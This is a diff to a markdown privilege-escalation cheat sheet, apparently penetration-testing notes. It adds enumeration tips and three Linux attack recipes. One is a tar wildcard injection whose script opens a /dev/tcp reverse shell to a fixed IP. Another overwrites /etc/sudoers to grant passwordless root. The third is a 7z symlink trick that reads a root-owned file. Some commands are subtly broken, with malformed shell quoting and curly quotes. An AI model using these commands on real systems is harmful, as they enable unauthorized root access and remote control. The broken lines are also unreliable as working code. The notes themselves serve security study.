@@ -26,7 +26,11 @@
   - [SeBackupPrivilege](#sebackupprivilege)
 - [Linux Privilege Escalation](#linux-privilege-escalation)
   - [Linux Manual Enumeration](#linux-manual-enumeration)
+  - [Linux Privilege Strategy](#linux-privilege-strategy)
   - [Common Linux Privilege Escalation](#common-linux-privilege-escalation)
+    - [Exploit tar with wilrdcard](#exploit-tar-with-wildcard)
+    - [Edit /etc/sudoers](#edit-/etc/sudoers)
+    - [Exploit 7z with wildcard](#exploit-7z-with-wildcard)
 
 # General
 ## Important Files
@@ -442,12 +446,27 @@ lsblk
 - When current user can't use wget that probably means we need to pivot as someone else
 - See if other person can ssh as root(check important files such as .bash_history, .bash_aliases)
 - If the current user can run webserver on victim machine, it's likely that we can only access that port on the same machine
-- 
+- Check what's running on local port
+- Check suggested conf, config files from linpeas
+- Check what's on /opt directory
+- Check mail in /var/mail /var/spool/mail
 
 ## Common Linux Privilege Escalation
-### tar with wilrdcard
+
+### Exploit tar with wilrdcard
 ```bash
 echo "/bin/bash -c '-i >& /dev/tcp/192.168.45.175/80 0>&1" > shell.sh
 echo "" > --checkpoint=1
 echo "" > "--checkpoint-action=exec=bash shell.sh"
+```
+
+### Edit /etc/sudoers
+```bash
+exec_command(‘echo “user ALL=(root) NOPASSWD: ALL” > /etc/sudoers’)
+```
+
+### Exploit 7z with wildcard && check error messages
+```bash
+touch @enox.zip
+ln -s /root/secret enox.zip
 ```
